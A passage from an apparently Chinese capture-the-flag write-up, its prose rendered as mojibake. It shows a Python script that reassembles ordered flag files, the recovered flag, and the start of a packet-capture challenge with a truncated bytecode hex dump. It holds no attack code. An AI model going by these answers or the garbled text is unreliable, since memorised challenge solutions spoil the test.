class="number">0x0115</span>,<span class="number">0x00A8</span>,<span class="number">0x034D</span>,<span class="number">0x0254</span>,<span class="number">0x01D7</span>,<span class="number">0x03E9</span>,<span class="number">0x035A</span>,<span class="number">0x0227</span>,<span class="number">0x0065</span>,<span class="number">0x016B</span>,<span class="number">0x03AC</span>,<span class="number">0x0383</span>,<span class="number">0x0039</span>,<span class="number">0x0195</span>,<span class="number">0x03EA</span>,<span class="number">0x030D</span>,<span class="number">0x03AE</span>,<span class="number">0x0282</span>,<span class="number">0x0078</span>,<span class="number">0x0015</span>,<span class="number">0x01B8</span>,<span class="number">0x011D</span>,<span class="number">0x0186</span>,<span class="number">0x00F6</span>,<span class="number">0x0018</span>,<span class="number">0x0148</span>,<span class="number">0x038E</span>,<span class="number">0x00F4</span>,<span class="number">0x0137</span>,<span class="number">0x01F0</span>,<span class="number">0x0122</span>,<span class="number">0x03CD</span>,<span class="number">0x011E</span>,<span class="number">0x0272</span>,<span class="number">0x01CE</span>,<span class="number">0x01F1</span>,<span class="number">0x03B8</span>,<span class="number">0x022B</span>,<span class="number">0x02AE</span>,<span class="number">0x00BE</span>,<span class="number">0x0385</span>,<span class="number">0x0133</span>,<span class="number">0x033E</span>,<span class="number">0x020C</span>,<span class="number">0x0210</span>,<span class="number">0x03A9</span>,<span class="number">0x01BD</span>,<span class="number">0x00ED</span>,<span class="number">0x0334</span>,<span class="number">0x0330</span>,<span class="number">0x0214</span>,<span class="number">0x008F</span>,<span class="number">0x014B</span>,<span class="number">0x00D7</span>,<span class="number">0x0004</span>,<span class="number">0x0265</span>,<span class="number">0x0143</span>,<span class="number">0x01A9</span>,<span class="number">0x0180</span>,<span class="number">0x0178</span>,<span class="number">0x034C</span>,<span class="number">0x0062</span>,<span class="number">0x0302</span>,<span class="number">0x01BE</span>,<span class="number">0x02F5</span>,<span class="number">0x0366</span>,<span class="number">0x00AD</span>,<span class="number">0x02AD</span>,<span class="number">0x0164</span>,<span class="number">0x0333</span>,<span class="number">0x0142</span>,<span class="number">0x036E</span>,<span class="number">0x03E0</span>,<span class="number">0x0345</span>,<span class="number">0x018A</span>,<span class="number">0x00E3</span>,<span class="number">0x00A3</span>,<span class="number">0x00FB</span>,<span class="number">0x028F</span>,<span class="number">0x03BF</span>,<span class="number">0x022F</span>,<span class="number">0x02DC</span>,<span class="number">0x039E</span>,<span class="number">0x03D9</span>,<span class="number">0x0314</span>,<span class="number">0x0068</span>,<span class="number">0x03B6</span>,<span class="number">0x00A6</span>,<span class="number">0x02D2</span>,<span class="number">0x0222</span>,<span class="number">0x0103</span>,<span class="number">0x004D</span>,<span class="number">0x03F9</span>,<span class="number">0x008B</span>,<span class="number">0x01F6</span>,<span class="number">0x018E</span>,<span class="number">0x03E3</span>,<span class="number">0x0300</span>,<span class="number">0x00C0</span>,<span class="number">0x02AA</span>,<span class="number">0x01A1</span>,<span class="number">0x0139</span>,<span class="number">0x019F</span>,<span class="number">0x0360</span>,<span class="number">0x025B</span>,<span class="number">0x01BA</span>,<span class="number">0x0276</span>,<span class="number">0x00F0</span>,<span class="number">0x038D</span>,<span class="number">0x001F</span>,<span class="number">0x0006</span>,<span class="number">0x028C</span>,<span class="number">0x0132</span>,<span class="number">0x03D6</span>,<span class="number">0x020B</span>,<span class="number">0x0198</span>,<span class="number">0x0188</span>,<span class="number">0x02A1</span>,<span class="number">0x0238</span>,<span class="number">0x01E6</span>,<span class="number">0x007C</span>,<span class="number">0x035D</span>,<span class="number">0x0064</span>,<span class="number">0x009F</span>,<span class="number">0x024A</span>,<span class="number">0x00D0</span>,<span class="number">0x01BB</span>,<span class="number">0x005E</span>,<span class="number">0x02BD</span>,<span class="number">0x019A</span>,<span class="number">0x0193</span>,<span class="number">0x00F8</span>,<span class="number">0x03A3</span>,<span class="number">0x0362</span>,<span class="number">0x019E</span>,<span class="number">0x00D4</span>,<span class="number">0x026E</span>,<span class="number">0x03EE</span>,<span class="number">0x0352</span>,<span class="number">0x015F</span>,<span class="number">0x0232</span>,<span class="number">0x01FB</span>,<span class="number">0x03C0</span>,<span class="number">0x02BA</span>,<span class="number">0x03BE</span>,<span class="number">0x02EB</span>,<span class="number">0x01C1</span>,<span class="number">0x0390</span>,<span class="number">0x0129</span>,<span class="number">0x0399</span>,<span class="number">0x00CC</span>,<span class="number">0x02AC</span>,<span class="number">0x02BB</span>,<span class="number">0x02A9</span>,<span class="number">0x0038</span>,<span class="number">0x00E4</span>,<span class="number">0x00E1</span>,<span class="number">0x009C</span>,<span class="number">0x020A</span>,<span class="number">0x0320</span>,<span class="number">0x0396</span>,<span class="number">0x0207</span>,<span class="number">0x01F9</span>,<span class="number">0x0192</span>,<span class="number">0x034E</span>,<span class="number">0x02B5</span>,<span class="number">0x01F8</span>,<span class="number">0x0328</span>,<span class="number">0x03CB</span>,<span class="number">0x0242</span>,<span class="number">0x00B7</span>,<span class="number">0x0381</span>,<span class="number">0x00B8</span>,<span class="number">0x03E7</span>,<span class="number">0x012F</span>,<span class="number">0x019C</span>,<span class="number">0x031C</span>,<span class="number">0x03F5</span>,<span class="number">0x0230</span>,<span class="number">0x023C</span>,<span class="number">0x0113</span>,<span class="number">0x006F</span>,<span class="number">0x00AE</span>,<span class="number">0x01DE</span>,<span class="number">0x0071</span>,<span class="number">0x0296</span>,<span class="number">0x01F7</span>,<span class="number">0x02A2</span>,<span class="number">0x004A</span>,<span class="number">0x0128</span>,<span class="number">0x0110</span>,<span class="number">0x005F</span>,<span class="number">0x0247</span>,<span class="number">0x01C4</span>,<span class="number">0x034B</span>,<span class="number">0x03E6</span>,<span class="number">0x03ED</span>,<span class="number">0x0318</span>,<span class="number">0x008C</span>,<span class="number">0x015A</span>,<span class="number">0x03BA</span>,<span class="number">0x03F6</span>,<span class="number">0x00AB</span>,<span class="number">0x0079</span>,<span class="number">0x0281</span>,<span class="number">0x00AF</span>,<span class="number">0x00EA</span>,<span class="number">0x01A2</span>,<span class="number">0x0127</span>,<span class="number">0x011C</span>,<span class="number">0x0056</span>,<span class="number">0x018F</span>,<span class="number">0x02BF</span>,<span class="number">0x0002</span>,<span class="number">0x0183</span>,<span class="number">0x03A1</span>,<span class="number">0x00CF</span>,<span class="number">0x013D</span>,<span class="number">0x029A</span>,<span class="number">0x031E</span>,<span class="number">0x0271</span>,<span class="number">0x0138</span>,<span class="number">0x0219</span>,<span class="number">0x0364</span>,<span class="number">0x0261</span>,<span class="number">0x0076</span>,<span class="number">0x01AB</span>,<span class="number">0x03E8</span>,<span class="number">0x00A5</span>,<span class="number">0x01EB</span>,<span class="number">0x03DD</span>,<span class="number">0x01A3</span>,<span class="number">0x0060</span>,<span class="number">0x0096</span>,<span class="number">0x017B</span>,<span class="number">0x007E</span>,<span class="number">0x01B3</span>,<span class="number">0x0354</span>,<span class="number">0x03E2</span>,<span class="number">0x012B</span>,<span class="number">0x0171</span>,<span class="number">0x03FC</span>,<span class="number">0x0009</span>,<span class="number">0x01C9</span>,<span class="number">0x01FC</span>,<span class="number">0x021E</span>,<span class="number">0x00B9</span>,<span class="number">0x032E</span>,<span class="number">0x02E4</span>,<span class="number">0x026C</span>,<span class="number">0x0085</span>,<span class="number">0x02D9</span>,<span class="number">0x02DF</span>,<span class="number">0x027A</span>,<span class="number">0x01AC</span>,<span class="number">0x03CE</span>,<span class="number">0x00E2</span>,<span class="number">0x0067</span>,<span class="number">0x0365</span>,<span class="number">0x0384</span>,<span class="number">0x01DC</span>,<span class="number">0x01F4</span>,<span class="number">0x0212</span>,<span class="number">0x0120</span>,<span class="number">0x00CD</span>,<span class="number">0x0221</span>,<span class="number">0x021B</span>,<span class="number">0x01DA</span>,<span class="number">0x0209</span>,<span class="number">0x013E</span>,<span class="number">0x031D</span>,<span class="number">0x005B</span>,<span class="number">0x0378</span>,<span class="number">0x016C</span>,<span class="number">0x0073</span>,<span class="number">0x00CA</span>,<span class="number">0x0255</span>,<span class="number">0x008D</span>,<span class="number">0x00C2</span>,<span class="number">0x0082</span>,<span class="number">0x009A</span>,<span class="number">0x0224</span>,<span class="number">0x001B</span>,<span class="number">0x0013</span>,<span class="number">0x0375</span>,<span class="number">0x0347</span>,<span class="number">0x0278</span>,<span class="number">0x01D6</span>,<span class="number">0x03D0</span>,<span class="number">0x00EF</span>,<span class="number">0x0371</span>,<span class="number">0x03EC</span>,<span class="number">0x002F</span>,<span class="number">0x03A0</span>,<span class="number">0x02B1</span>,<span class="number">0x03FA</span>,<span class="number">0x0025</span>,<span class="number">0x01D8</span>,<span class="number">0x004F</span>,<span class="number">0x01B1</span>,<span class="number">0x02C3</span>,<span class="number">0x029F</span>,<span class="number">0x0309</span>,<span class="number">0x02A4</span>,<span class="number">0x028B</span>,<span class="number">0x0093</span>,<span class="number">0x02BC</span>,<span class="number">0x00D5</span>,<span class="number">0x0288</span>,<span class="number">0x01B6</span>,<span class="number">0x00FF</span>,<span class="number">0x0114</span>,<span class="number">0x03F3</span>,<span class="number">0x030E</span>,<span class="number">0x021F</span>,<span class="number">0x0021</span>,<span class="number">0x00D6</span>,<span class="number">0x018D</span>,<span class="number">0x036F</span>,<span class="number">0x0321</span>,<span class="number">0x0353</span>,<span class="number">0x0029</span>,<span class="number">0x015B</span>,<span class="number">0x0346</span>,<span class="number">0x03D7</span>,<span class="number">0x034F</span>,<span class="number">0x0043</span>,<span class="number">0x0173</span>,<span class="number">0x03DB</span>,<span class="number">0x0160</span>,<span class="number">0x0292</span>,<span class="number">0x0392</span>,<span class="number">0x0337</span>,<span class="number">0x0030</span>,<span class="number">0x017F</span>,<span class="number">0x02F7</span>,<span class="number">0x0124</span>,<span class="number">0x003E</span>,<span class="number">0x02F6</span>,<span class="number">0x01AF</span>,<span class="number">0x010E</span>,<span class="number">0x039D</span>,<span class="number">0x0246</span>,<span class="number">0x0287</span>,<span class="number">0x01B9</span>,<span class="number">0x021A</span>,<span class="number">0x010C</span>,<span class="number">0x0394</span>,<span class="number">0x0250</span>,<span class="number">0x00F3</span>,<span class="number">0x03A2</span>,<span class="number">0x0000</span>,<span class="number">0x0116</span>,<span class="number">0x03AD</span>,<span class="number">0x0377</span>,<span class="number">0x011A</span>,<span class="number">0x02EF</span>,<span class="number">0x02CA</span>,<span class="number">0x0153</span>,<span class="number">0x0312</span>,<span class="number">0x01E8</span>,<span class="number">0x034A</span>,<span class="number">0x0311</span>,<span class="number">0x0229</span>,<span class="number">0x02AF</span>,<span class="number">0x03A5</span>,<span class="number">0x0359</span>,<span class="number">0x036D</span>,<span class="number">0x01A6</span>,<span class="number">0x023B</span>,<span class="number">0x021D</span>,<span class="number">0x00FA</span>,<span class="number">0x02D0</span>,<span class="number">0x0335</span>,<span class="number">0x00BD</span>,<span class="number">0x025F</span>,<span class="number">0x0326</span>,<span class="number">0x037F</span>,<span class="number">0x03A8</span>,<span class="number">0x01EA</span>,<span class="number">0x011B</span>,<span class="number">0x029E</span>,<span class="number">0x03CC</span>,<span class="number">0x0201</span>,<span class="number">0x038A</span>,<span class="number">0x016A</span>,<span class="number">0x0380</span>,<span class="number">0x0037</span>,<span class="number">0x013F</span>,<span class="number">0x0080</span>,<span class="number">0x029B</span>,<span class="number">0x01CA</span>,<span class="number">0x0253</span>,<span class="number">0x02E9</span>,<span class="number">0x0088</span>,<span class="number">0x0370</span>,<span class="number">0x01C8</span>,<span class="number">0x02F1</span>,<span class="number">0x03B3</span>,<span class="number">0x0205</span>,<span class="number">0x003A</span>,<span class="number">0x0317</span>,<span class="number">0x01AD</span>,<span class="number">0x0125</span>,<span class="number">0x0187</span>,<span class="number">0x0197</span>,<span class="number">0x0237</span>,<span class="number">0x014E</span>,<span class="number">0x025E</span>,<span class="number">0x036A</span>,<span class="number">0x011F</span>,<span class="number">0x020F</span>,<span class="number">0x00A9</span>,<span class="number">0x014C</span>,<span class="number">0x008E</span>,<span class="number">0x030C</span>,<span class="number">0x032B</span>,<span class="number">0x0052</span>,<span class="number">0x0141</span>,<span class="number">0x0355</span>,<span class="number">0x0297</span>,<span class="number">0x0295</span>,<span class="number">0x0275</span>,<span class="number">0x013A</span>,<span class="number">0x0350</span>,<span class="number">0x0157</span>,<span class="number">0x02AB</span>,<span class="number">0x03FF</span>,<span class="number">0x00F7</span>,<span class="number">0x0098</span>,<span class="number">0x00DD</span>,<span class="number">0x015E</span>,<span class="number">0x0387</span>,<span class="number">0x01E4</span>,<span class="number">0x0087</span>,<span class="number">0x0055</span>,<span class="number">0x0159</span>,<span class="number">0x013C</span>,<span class="number">0x0105</span>,<span class="number">0x019B</span>,<span class="number">0x01D1</span>,<span class="number">0x0194</span>,<span class="number">0x02CF</span>,<span class="number">0x0045</span>,<span class="number">0x02B0</span>,<span class="number">0x00C6</span>,<span class="number">0x0022</span>,<span class="number">0x026F</span>,<span class="number">0x01E0</span>,<span class="number">0x01DD</span>,<span class="number">0x033B</span>,<span class="number">0x03FD</span>,<span class="number">0x01D2</span>,<span class="number">0x0154</span>,<span class="number">0x005D</span>,<span class="number">0x0389</span>,<span class="number">0x0024</span>,<span class="number">0x039F</span>,<span class="number">0x01DF</span>,<span class="number">0x028D</span>,<span class="number">0x03BB</span>,<span class="number">0x0245</span>,<span class="number">0x0011</span>,<span class="number">0x0003</span>,<span class="number">0x0027</span>,<span class="number">0x00C7</span>,<span class="number">0x02BE</span>,<span class="number">0x0047</span>,<span class="number">0x00C9</span>,<span class="number">0x02B6</span>,<span class="number">0x01B5</span>,<span class="number">0x009B</span>,<span class="number">0x006E</span>,<span class="number">0x03C3</span>,<span class="number">0x016E</span>,<span class="number">0x00B5</span>,<span class="number">0x025D</span>,<span class="number">0x0059</span>,<span class="number">0x0016</span>,<span class="number">0x0008</span>,<span class="number">0x002D</span>,<span class="number">0x0066</span>,<span class="number">0x007A</span>,<span class="number">0x037B</span>,<span class="number">0x01BF</span>,<span class="number">0x0308</span>,<span class="number">0x02ED</span>,<span class="number">0x035C</span>,<span class="number">0x02CD</span>,<span class="number">0x00E5</span>,<span class="number">0x00C5</span>,<span class="number">0x0208</span>,<span class="number">0x02FB</span>,<span class="number">0x0280</span>,<span class="number">0x01CF</span>,<span class="number">0x025A</span>,<span class="number">0x03DA</span>,<span class="number">0x018B</span>,<span class="number">0x017A</span>,<span class="number">0x02B8</span>,<span class="number">0x0104</span>,<span class="number">0x0190</span>,<span class="number">0x003D</span>,<span class="number">0x03BD</span>,<span class="number">0x0089</span>,<span class="number">0x0204</span>,<span class="number">0x0391</span>,<span class="number">0x0289</span>,<span class="number">0x014F</span>,<span class="number">0x0274</span>,<span class="number">0x01C3</span>,<span class="number">0x0322</span>,<span class="number">0x0151</span>,<span class="number">0x0196</span>,<span class="number">0x02C2</span>,<span class="number">0x03D2</span>,<span class="number">0x03F7</span>,<span class="number">0x0294</span>,<span class="number">0x01D9</span>,<span class="number">0x00BA</span>,<span class="number">0x0158</span>,<span class="number">0x03FE</span>,<span class="number">0x03B1</span>,<span class="number">0x03B5</span>,<span class="number">0x01ED</span>,<span class="number">0x014D</span>,<span class="number">0x0136</span>,<span class="number">0x023A</span>,<span class="number">0x0042</span>,<span class="number">0x0374</span>,<span class="number">0x0315</span>,<span class="number">0x0395</span>,<span class="number">0x00E9</span>,<span class="number">0x0342</span>,<span class="number">0x00DE</span>,<span class="number">0x00D1</span>,<span class="number">0x01B2</span>,<span class="number">0x0340</span>,<span class="number">0x0020</span>,<span class="number">0x004E</span>,<span class="number">0x015C</span>,<span class="number">0x013B</span>,<span class="number">0x00AC</span>,<span class="number">0x0363</span>,<span class="number">0x02D4</span>,<span class="number">0x0223</span>,<span class="number">0x0026</span>,<span class="number">0x00DB</span>,<span class="number">0x017E</span>,<span class="number">0x0123</span>,<span class="number">0x006B</span>,<span class="number">0x02DD</span>,<span class="number">0x02FF</span>,<span class="number">0x0299</span>,<span class="number">0x00F1</span>,<span class="number">0x0084</span>,<span class="number">0x0217</span>,<span class="number">0x0014</span>,<span class="number">0x0090</span>,<span class="number">0x0176</span>,<span class="number">0x0206</span>,<span class="number">0x02B4</span>,<span class="number">0x023E</span>,<span class="number">0x0372</span>,<span class="number">0x032F</span>,<span class="number">0x023D</span>,<span class="number">0x01C0</span>,<span class="number">0x02E6</span>,<span class="number">0x0220</span>,<span class="number">0x0072</span>,<span class="number">0x02FE</span>,<span class="number">0x03C9</span>,<span class="number">0x01D0</span>,<span class="number">0x0053</span>,<span class="number">0x0329</span>,<span class="number">0x01C6</span>,<span class="number">0x033D</span>,<span class="number">0x027C</span>,<span class="number">0x03B9</span>,<span class="number">0x0369</span>,<span class="number">0x0028</span>,<span class="number">0x0050</span>,<span class="number">0x02DA</span>,<span class="number">0x00D9</span>,<span class="number">0x01E9</span>,<span class="number">0x001A</span>,<span class="number">0x02CB</span>,<span class="number">0x0172</span>,<span class="number">0x02E8</span>,<span class="number">0x0356</span>,<span class="number">0x0191</span>,<span class="number">0x02EE</span>,<span class="number">0x0095</span>,<span class="number">0x01C2</span>,<span class="number">0x0094</span>,<span class="number">0x007F</span>,<span class="number">0x0251</span>,<span class="number">0x0184</span>,<span class="number">0x0144</span>,<span class="number">0x024B</span>,<span class="number">0x03B0</span>,<span class="number">0x0121</span>,<span class="number">0x0203</span>,<span class="number">0x0264</span>,<span class="number">0x022E</span>,<span class="number">0x0348</span>,<span class="number">0x02FD</span>,<span class="number">0x0373</span>,<span class="number">0x0249</span>,<span class="number">0x0036</span>,<span class="number">0x02C8</span>,<span class="number">0x027B</span>,<span class="number">0x0226</span>,<span class="number">0x016D</span>,<span class="number">0x03C7</span>,<span class="number">0x0017</span>,<span class="number">0x0040</span>,<span class="number">0x0386</span>,<span class="number">0x0262</span>,<span class="number">0x0270</span>,<span class="number">0x0252</span>,<span class="number">0x02E5</span>,<span class="number">0x0234</span>,<span class="number">0x010F</span>,<span class="number">0x03C4</span>,<span class="number">0x010B</span>,<span class="number">0x0150</span>,<span class="number">0x0293</span>,<span class="number">0x02B9</span>,<span class="number">0x016F</span>,<span class="number">0x0382</span>,<span class="number">0x03AB</span>,<span class="number">0x0189</span>,<span class="number">0x02B7</span>,<span class="number">0x039B</span>,<span class="number">0x0146</span>,<span class="number">0x01F2</span>,<span class="number">0x030F</span>,<span class="number">0x00CB</span>,<span class="number">0x0054</span>,<span class="number">0x00C8</span>,<span class="number">0x01DB</span>,<span class="number">0x035E</span>,<span class="number">0x0388</span>,<span class="number">0x0083</span>,<span class="number">0x001D</span>,<span class="number">0x007B</span>,<span class="number">0x00FE</span>,<span class="number">0x0181</span>,<span class="number">0x010A</span>,<span class="number">0x0033</span>,<span class="number">0x01E2</span>,<span class="number">0x03C1</span>,<span class="number">0x03E4</span>,<span class="number">0x02FA</span>,<span class="number">0x0163</span>,<span class="number">0x0358</span>,<span class="number">0x0069</span>,<span class="number">0x00E7</span>,<span class="number">0x02E0</span>,<span class="number">0x017D</span>,<span class="number">0x00EE</span>,<span class="number">0x0290</span>,<span class="number">0x0166</span>,<span class="number">0x027E</span>,<span class="number">0x003B</span>,<span class="number">0x02F4</span>,<span class="number">0x00D3</span>,<span class="number">0x0341</span>,<span class="number">0x0279</span>,<span class="number">0x0179</span>,<span class="number">0x0228</span>,<span class="number">0x0152</span>,<span class="number">0x02B2</span>,<span class="number">0x036C</span>,<span class="number">0x0119</span>,<span class="number">0x0336</span>,<span class="number">0x03AA</span>,<span class="number">0x0174</span>,<span class="number">0x029D</span>,<span class="number">0x0117</span>,<span class="number">0x03A7</span>,<span class="number">0x023F</span>,<span class="number">0x02D6</span>,<span class="number">0x0218</span>,<span class="number">0x01FD</span>,<span class="number">0x0134</span>,<span class="number">0x0019</span>,<span class="number">0x02C0</span>,<span class="number">0x000D</span>,<span class="number">0x0161</span>,<span class="number">0x032D</span>,<span class="number">0x0010</span>,<span class="number">0x0149</span>,<span class="number">0x0167</span>,<span class="number">0x002E</span>,<span class="number">0x004B</span>,<span class="number">0x0200</span>,<span class="number">0x03C6</span>,<span class="number">0x0046</span>,<span class="number">0x00B3</span>,<span class="number">0x005A</span>,<span class="number">0x01D5</span>,<span class="number">0x0202</span>,<span class="number">0x0313</span>,<span class="number">0x0131</span>,<span class="number">0x012C</span>,<span class="number">0x0332</span>,<span class="number">0x00B2</span>,<span class="number">0x0213</span>,<span class="number">0x01A5</span>,<span class="number">0x02EA</span>,<span class="number">0x026A</span>,<span class="number">0x02D5</span>,<span class="number">0x000E</span>,<span class="number">0x007D</span>,<span class="number">0x03B2</span>,<span class="number">0x02C9</span>,<span class="number">0x00EB</span>,<span class="number">0x0031</span>,<span class="number">0x03D5</span>,<span class="number">0x00B4</span>,<span class="number">0x01E7</span>,<span class="number">0x00BC</span>,<span class="number">0x039A</span>,<span class="number">0x0155</span>,<span class="number">0x0367</span>,<span class="number">0x032A</span>,<span class="number">0x0156</span>,<span class="number">0x0303</span>,<span class="number">0x0285</span>,<span class="number">0x0351</span>,<span class="number">0x0258</span>,<span class="number">0x02D1</span>,<span class="number">0x00A7</span>,<span class="number">0x027F</span>,<span class="number">0x0112</span>,<span class="number">0x01EC</span>,<span class="number">0x0316</span>,<span class="number">0x02C6</span>,<span class="number">0x002B</span>,<span class="number">0x00A0</span>,<span class="number">0x0284</span>,<span class="number">0x0048</span>,<span class="number">0x00CE</span>,<span class="number">0x01E3</span>,<span class="number">0x0241</span>,<span class="number">0x00B0</span>,<span class="number">0x025C</span>,<span class="number">0x02A6</span>,<span class="number">0x01CC</span>,<span class="number">0x0306</span>,<span class="number">0x02C4</span>,<span class="number">0x00B1</span>,<span class="number">0x0240</span>,<span class="number">0x02E7</span>,<span class="number">0x03DF</span>,<span class="number">0x029C</span>,<span class="number">0x0331</span>,<span class="number">0x00DF</span>,<span class="number">0x0075</span>,<span class="number">0x0005</span>,<span class="number">0x006A</span>,<span class="number">0x03B7</span>,<span class="number">0x003F</span>,<span class="number">0x00D2</span>,<span class="number">0x01F3</span>,<span class="number">0x026B</span>,<span class="number">0x032C</span>,<span class="number">0x00FC</span>,<span class="number">0x0058</span>,<span class="number">0x01D4</span>,<span class="number">0x0393</span>,<span class="number">0x0324</span>,<span class="number">0x01AE</span>,<span class="number">0x038F</span>,<span class="number">0x018C</span>,<span class="number">0x01FE</span>,<span class="number">0x03C2</span>,<span class="number">0x0182</span>,<span class="number">0x015D</span>,<span class="number">0x00E6</span>,<span class="number">0x020D</span>,<span class="number">0x0175</span>,<span class="number">0x012D</span>,<span class="number">0x0032</span>,<span class="number">0x03CA</span>,<span class="number">0x02E1</span>,<span class="number">0x038B</span>,<span class="number">0x03D4</span>,<span class="number">0x0277</span>,<span class="number">0x02F9</span>,<span class="number">0x0257</span>,<span class="number">0x02A7</span>,<span class="number">0x031A</span>,<span class="number">0x00A4</span>,<span class="number">0x03DC</span>,<span class="number">0x01C5</span>,<span class="number">0x024C</span>,<span class="number">0x0211</span>,<span class="number">0x00C3</span>,<span class="number">0x0244</span>,<span class="number">0x001E</span>,<span class="number">0x022A</span>,<span class="number">0x0283</span>,<span class="number">0x027D</span>,<span class="number">0x035F</span>,<span class="number">0x00DC</span>,<span class="number">0x03A6</span>,<span class="number">0x0379</span>,<span class="number">0x033F</span>,<span class="number">0x0376</span>,<span class="number">0x00E8</span>,<span class="number">0x0118</span>,<span class="number">0x0145</span>,<span class="number">0x03D3</span>,<span class="number">0x0057</span>,<span class="number">0x000B</span>]</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> indexes:</span><br><span class="line">    fileName = <span class="string">f&quot;flag_f<span class="subst">&#123;<span class="built_in">str</span>(<span class="built_in">int</span>(index)).zfill(<span class="number">5</span>)&#125;</span>&quot;</span></span><br><span class="line">    result += <span class="built_in">open</span>(fileName, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;b.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">file.write(result)</span><br><span class="line">file.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹åŒ…å« flag çš„æ–‡æœ¬ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!Sdk*t eiW!BJ9$QpR. pIk&#123;V#t:NE;J8M&#123;Qi&gt;W%|1vw&lt;9_*2AG\SX_6&#123;)&#39;n4)GwcPx8gp[6Z_&#39;.#Y(&#x3D;zCs&#x2F;2*^DwpC6@&#x3D;KBz\+0ngA@C(cJSiE&#39;ShHjW,*Xu&#123;Y&gt;5rGyMWX_mY,htG1KLE&#96;pNNMYd?U\SF&lt;%O,qeVflr$,CO@V.s-%.@C&#39;&amp;I2[36?&lt;k)N^Z0~IgP-k&#x3D;L-Ip0URu_&lt;P6T?&#x2F;LF\~K~q6%76&#125;!_WR&amp;nojVK&#96;KGYZwx&quot;G4^4&#x3D;&amp;cOO0&amp;%:QWo~cBBUM#LD$gLK?887&lt;a$z&#x2F;Xh&#x3D;V(J&#96;jus9Jw-Pmp1&#x3D;[|b5;&quot;Z&#123;[qNI&amp;9&#x2F;.2@b&gt;&#39;Vxo &#123;1)xT_&#39;3FoRIP~O&#96;&amp;!K&#39;ZAKM&lt;Hrg$D_*&gt;8G%UT&#123;oN41|4P42S~6*g2KJ&#125;o,8j&#x2F;]&amp;FimP0V2c::+&#123;#;Bj@Cd\w9ioA&amp;is#g#6!_9SI4Xx6rKoN ZhzD##,4!&#x2F;bbB(v&#x2F;Q(6ez&#123;bKoH&#39;-B&#39;*hg5xq$n0xz 0v9wfbGs|[K-ana]D!+*\+&#96;abDa7w16BySRx-#D&#x2F;-a1O55Q&#96;F&lt;75&#123;8f)4rlgQW]K&#x3D;oT1J$Ar&#x3D; W$LW9!~TphteN&#x3D;b&amp;s&#125;.714G_8W~!@8&#x3D;%gh%&quot;K:&lt;@7o*5+y+&#125;+fCF&#39;NEYN0&#123;P4T_hz(3|Y7ZA1fsu\B6bxi#_+wKPs^C1^Ywa,&#123;&#39;&amp;i]Hq+P8&lt;WQ5sKu!abFLAG&#123;Dir3ct0ry_jYa_n41&#125;R:k_#z^&#39;mT?,3$H &quot;W+xr-Yzn-D-ribi,wKf|&amp;$2:&#x2F;q?8:jmcI|4L:+&#96;KDx])5+A_m13&#x2F;7R1VQ:[Dc&amp;.TcvPv$tOb&#125;X&amp;-K&#39;f:.&lt;,bO~0r,&#x3D;olgKP&amp;x U %(HFjNtCDaJiHW+N1WK&#x3D;(Ho_*K2&lt;^&gt;b&lt;&lt;_]~4rn&#x3D;k#7i,3YHK_Z;o%8[xZy;:&lt;1&#125;OT1IHSn&gt;gn&#96;n;YI9[M&#39;t@v%&#125;Iz0fmVl#ls+aI\: 6?|VvGHD~Q0O4&#123;-.siztGve H&lt;f@kXEt@WWHW&quot;,81m*S1lbQZ+mK9rB&#39;TD^)-)0TzO6tUGf5#6bFo&gt;L7,*oJ&amp;wL*&#125;.7pRx&quot;t1vzM):FL3r@:-C1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Dir3ct0ry_jYa_n41&#125;</span><br></pre></td></tr></table></figure><h3 id="ExtremelySlow"><a href="#ExtremelySlow" class="headerlink" title="ExtremelySlow"></a>ExtremelySlow</h3><p>è¿½è¸ª TCP æµå¯è§å“åº”ä¸­å«æœ‰ <code>content-range: bytes 641-641/1987</code> æç¤ºäº†å­—ç¬¦é¡ºåºã€‚ä½¿ç”¨ WireShark å¯¼å‡ºåˆ†ç»„è§£æç»“æœåä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å°†å†…å®¹å’Œé¡ºåºæå–å‡ºæ¥ï¼Œæ”¾åˆ° Excel ä¸­æ’å¥½åºï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6f 0d 0d 0a 00 00 00 00 af e7 b5 60 9a 06 00 00 e3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 07 00 00 00 40 00 00 00 73 1a 01 00 00 64 00 64 01 6c 00 5a 00 64 00 64 02 6c 01 6d 02 5a 02 01 00 64 03 64 04 84 00 5a 03 64 05 64 06 84 00 5a 04 64 07 64 08 84 00 5a 05 64 09 64 0a 84 00 5a 06 65 07 64 0b 6b 02 72 8b 64 0c 5a 08 64 0d 5a 09 64 0e 5a 0a 64 0f 5a 0b 64 10 5a 0c 64 11 64 12 64 13 64 14 64 15 9c 04 5a 0d 64 16 64 17 64 18 64 19 64 1a 9c 04 5a 0e 65 0d 64 1b 64 1c 84 00 65 0e 44 00 83 01 4f 00 5a 0d 65 0d 64 1d 64 1e 84 00 65 0a 44 00 83 01 4f 00 5a 0d 65 05 65 0f 65 10 64 1f 64 20 84 00 65 11 65 0d a0 12 a1 00 83 01 83 02 83 01 83 01 5a 13 65 14 65 06 65 08 65 13 83 02 a0 15 a1 00 83 01 01 00 65 00 6a 16 6a 17 a0 18 a1 00 5a 19 65 06 65 09 65 13 83 02 5a 09 65 06 65 19 65 13 83 02 5a 1a 65 02 65 1a 83 01 a0 1b a1 00 65 0b 6b 02 72 83 65 14 65 06 65 0c 65 13 83 02 a0 15 a1 00 83 01 01 00 64 01 53 00 65 14 65 09 a0 15 a1 00 83 01 01 00 64 01 53 00 64 01 53 00 29 21 e9 00 00 00 00 4e a9 01 da 06 73 68 61 32 35 36 63 01 00 00 00 00 00 00 00 00 00 00 00 05 00 00 00 05 00 00 00 43 00 00 00 73 60 00 00 00 74 00 7c 00 83 01 7d 01 74 